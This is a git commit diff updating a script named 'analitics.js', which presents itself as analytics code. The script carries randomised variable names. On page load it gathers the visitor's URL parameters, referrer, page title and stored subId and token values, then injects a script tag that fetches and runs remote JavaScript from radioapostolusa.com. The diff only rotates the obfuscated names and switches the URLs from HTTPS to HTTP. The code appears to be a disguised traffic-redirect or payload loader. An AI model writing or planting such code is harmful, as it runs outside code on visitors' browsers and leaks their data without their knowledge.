89ccbb9ecc63e7a8699f551c666b6ea9d437fc44
divengood <70320764+divengood@users.noreply.github.com>
2020-08-27 17:06:43 +0300

    Update analitics.js

--- analitics.js
+++ analitics.js
@@ -1,42 +1,42 @@
 <script>
     (function() {
-    var name = '_v7R224y2BHqCfzc9';
-    if (!window._v7R224y2BHqCfzc9) {
-        window._v7R224y2BHqCfzc9 = {
+    var name = '_QxWSF2zj5SjhfTNz';
+    if (!window._QxWSF2zj5SjhfTNz) {
+        window._QxWSF2zj5SjhfTNz = {
             unique: false,
             ttl: 86400,
-            R_PATH: 'https://radioapostolusa.com/pJhktJ',
-            P_PATH: 'https://radioapostolusa.com/79f10ac/postback',
+            R_PATH: 'http://radioapostolusa.com/pJhktJ',
+            P_PATH: 'http://radioapostolusa.com/79f10ac/postback',
         };
     }
-    const _v5Km1gyzXmSZTvMc = localStorage.getItem('config');
-    if (typeof _v5Km1gyzXmSZTvMc !== 'undefined' && _v5Km1gyzXmSZTvMc !== null) {
-        var _ZH9GxsksVW5Zq4rt = JSON.parse(_v5Km1gyzXmSZTvMc);
-        var _H7RGPdxmkBJwdjF7 = Math.round(+new Date()/1000);
-        if (_ZH9GxsksVW5Zq4rt.created_at + window._v7R224y2BHqCfzc9.ttl < _H7RGPdxmkBJwdjF7) {
+    const _8Jt4239sjw7hKhPp = localStorage.getItem('config');
+    if (typeof _8Jt4239sjw7hKhPp !== 'undefined' && _8Jt4239sjw7hKhPp !== null) {
+        var _1HWBZsgw16mtqcSG = JSON.parse(_8Jt4239sjw7hKhPp);
+        var _7GKm9PGjGWKQ4hYz = Math.round(+new Date()/1000);
+        if (_1HWBZsgw16mtqcSG.created_at + window._QxWSF2zj5SjhfTNz.ttl < _7GKm9PGjGWKQ4hYz) {
             localStorage.removeItem('subId');
             localStorage.removeItem('token');
             localStorage.removeItem('config');
         }
     }
-    var _sHcXKYXtGfP1mZwZ = localStorage.getItem('subId');
-    var _kZ21rX9RzQjykxkX = localStorage.getItem('token');
-    var _W83bX9BFfzNbJV37 = '?return=js.client';
-        _W83bX9BFfzNbJV37 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
-        _W83bX9BFfzNbJV37 += '&se_referrer=' + encodeURIComponent(document.referrer);
-        _W83bX9BFfzNbJV37 += '&default_keyword=' + encodeURIComponent(document.title);
-        _W83bX9BFfzNbJV37 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
-        _W83bX9BFfzNbJV37 += '&name=' + encodeURIComponent(name);
-        _W83bX9BFfzNbJV37 += '&host=' + encodeURIComponent(window._v7R224y2BHqCfzc9.R_PATH);
-    if (typeof _sHcXKYXtGfP1mZwZ !== 'undefined' && _sHcXKYXtGfP1mZwZ && window._v7R224y2BHqCfzc9.unique) {
-        _W83bX9BFfzNbJV37 += '&sub_id=' + encodeURIComponent(_sHcXKYXtGfP1mZwZ);
+    var _RwdzP4X6sWYvsnFV = localStorage.getItem('subId');
+    var _gbSNwp1hFx7snNLD = localStorage.getItem('token');
+    var _RNtcgMm4ST9NPgMV = '?return=js.client';
+        _RNtcgMm4ST9NPgMV += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _RNtcgMm4ST9NPgMV += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _RNtcgMm4ST9NPgMV += '&default_keyword=' + encodeURIComponent(document.title);
+        _RNtcgMm4ST9NPgMV += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _RNtcgMm4ST9NPgMV += '&name=' + encodeURIComponent(name);
+        _RNtcgMm4ST9NPgMV += '&host=' + encodeURIComponent(window._QxWSF2zj5SjhfTNz.R_PATH);
+    if (typeof _RwdzP4X6sWYvsnFV !== 'undefined' && _RwdzP4X6sWYvsnFV && window._QxWSF2zj5SjhfTNz.unique) {
+        _RNtcgMm4ST9NPgMV += '&sub_id=' + encodeURIComponent(_RwdzP4X6sWYvsnFV);
     }
-    if (typeof _kZ21rX9RzQjykxkX !== 'undefined' && _kZ21rX9RzQjykxkX && window._v7R224y2BHqCfzc9.unique) {
-        _W83bX9BFfzNbJV37 += '&token=' + encodeURIComponent(_kZ21rX9RzQjykxkX);
+    if (typeof _gbSNwp1hFx7snNLD !== 'undefined' && _gbSNwp1hFx7snNLD && window._QxWSF2zj5SjhfTNz.unique) {
+        _RNtcgMm4ST9NPgMV += '&token=' + encodeURIComponent(_gbSNwp1hFx7snNLD);
     }
     var a = document.createElement('script');
         a.type = 'application/javascript';
-        a.src = window._v7R224y2BHqCfzc9.R_PATH + _W83bX9BFfzNbJV37;
+        a.src = window._QxWSF2zj5SjhfTNz.R_PATH + _RNtcgMm4ST9NPgMV;
     var s = document.getElementsByTagName('script')[0];
     s.parentNode.insertBefore(a, s)
     })();
